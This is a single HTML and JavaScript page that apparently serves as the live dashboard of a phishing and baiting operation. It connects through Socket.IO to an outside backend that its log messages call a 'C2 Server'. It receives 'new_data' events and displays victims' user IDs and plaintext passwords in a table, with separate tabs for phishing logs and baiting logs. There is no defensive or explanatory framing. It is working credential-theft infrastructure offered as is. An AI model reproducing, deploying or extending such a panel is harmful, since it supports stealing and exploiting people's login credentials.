<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Aura | Real-Time Exfiltration Database</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background-color: #020617; color: #10b981; font-family: 'Courier New', monospace; }
        .tab-active { border-bottom: 2px solid #10b981; color: white; }
        .log-entry { animation: slideIn 0.3s ease-out; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="p-8">
    <div class="max-w-6xl mx-auto">
        <header class="mb-10 flex justify-between items-center border-b border-slate-800 pb-4">
            <h1 class="text-2xl font-bold tracking-tighter">LIVE_EXFIL_STREAM v2.0</h1>
            <div id="status" class="text-xs text-red-500 font-bold uppercase tracking-widest px-3 py-1 bg-red-500/10 rounded-full border border-red-500/20">
                OFFLINE_DISCONNECTED
            </div>
        </header>

        <div class="flex space-x-4 mb-6">
            <button onclick="setTab('PHISHING')" id="t-phish" class="tab-active px-4 py-2 transition-all">PHISHING_LOGS</button>
            <button onclick="setTab('BAITING')" id="t-bait" class="px-4 py-2 opacity-50 hover:opacity-100 transition-all">BAITING_LOGS</button>
        </div>

        <div class="bg-slate-900 rounded-xl border border-slate-800 overflow-hidden shadow-2xl">
            <table class="w-full text-left">
                <thead>
                    <tr class="bg-slate-950 text-slate-500 text-xs">
                        <th class="p-4">TIME</th>
                        <th class="p-4">USER_ID</th>
                        <th class="p-4">PLAINTEXT_PASS</th>
                        <th class="p-4">TYPE</th>
                    </tr>
                </thead>
                <tbody id="rows">
                    </tbody>
            </table>
        </div>
    </div>

    <script>
        // 1. Connection Setup - Ensure the URL matches your Render backend exactly
        const socket = io("https://cybersecurity-2-b9k7.onrender.com");
        let logs = [];
        let currentTab = 'PHISHING';

        // 2. Lifecycle Listeners
        socket.on('connect', () => {
            console.log("ðŸŸ¢ Connected to C2 Server");
            updateStatus("SYSTEM_ONLINE", "text-green-500", "bg-green-500/10", "border-green-500/20");
        });

        socket.on('disconnect', () => {
            console.log("ðŸ”´ Connection Lost");
            updateStatus("OFFLINE_DISCONNECTED", "text-red-500", "bg-red-500/10", "border-red-500/20");
        });

        // 3. Data Listener
        socket.on('new_data', (data) => {
            console.log("ðŸ“¥ Data Received:", data);
            logs.unshift(data); // Add new data to the top
            
            // Alert user of incoming data
            const statusEl = document.getElementById('status');
            statusEl.innerText = "!!! INCOMING DATA !!!";
            statusEl.className = "text-white bg-red-600 px-3 py-1 rounded-full font-bold animate-pulse";
            
            setTimeout(() => {
                updateStatus("SYSTEM_ONLINE", "text-green-500", "bg-green-500/10", "border-green-500/20");
            }, 3000);

            render();
        });

        function updateStatus(text, textColor, bgColor, borderColor) {
            const el = document.getElementById('status');
            el.innerText = text;
            el.className = `text-xs ${textColor} font-bold uppercase tracking-widest px-3 py-1 ${bgColor} rounded-full border ${borderColor}`;
        }

        function setTab(tab) {
            currentTab = tab;
            render();
        }

        function render() {
            const container = document.getElementById('rows');
            
            const filtered = logs.filter(l => {
                const type = l.type ? l.type.toUpperCase() : "";
                if (currentTab === 'PHISHING') {
                    return type.includes('PHISH') || type.includes('GMAIL') || type.includes('LINK');
                }
                return type.includes('BAITING');
            });

            // Update Tab Styles
            document.getElementById('t-phish').className = currentTab === 'PHISHING' ? 'tab-active px-4 py-2' : 'px-4 py-2 opacity-50';
            document.getElementById('t-bait').className = currentTab === 'BAITING' ? 'tab-active px-4 py-2' : 'px-4 py-2 opacity-50';

            if (filtered.length === 0) {
                container.innerHTML = '<tr><td colspan="4" class="p-10 text-center text-slate-700 text-xs italic">Awaiting exfiltrated packets...</td></tr>';
                return;
            }

            container.innerHTML = filtered.map(log => `
                <tr class="log-entry border-b border-slate-800 hover:bg-white/5 transition-all">
                    <td class="p-4 text-slate-500 text-xs font-mono">${log.time}</td>
                    <td class="p-4 text-white font-bold">${log.user}</td>
                    <td class="p-4 text-red-500 font-black tracking-widest">${log.pass}</td>
                    <td class="p-4 text-indigo-400 text-[10px] uppercase font-bold">${log.type}</td>
                </tr>
            `).join('');
        }

        // Initial empty state
        render();
    </script>
</body>
</html>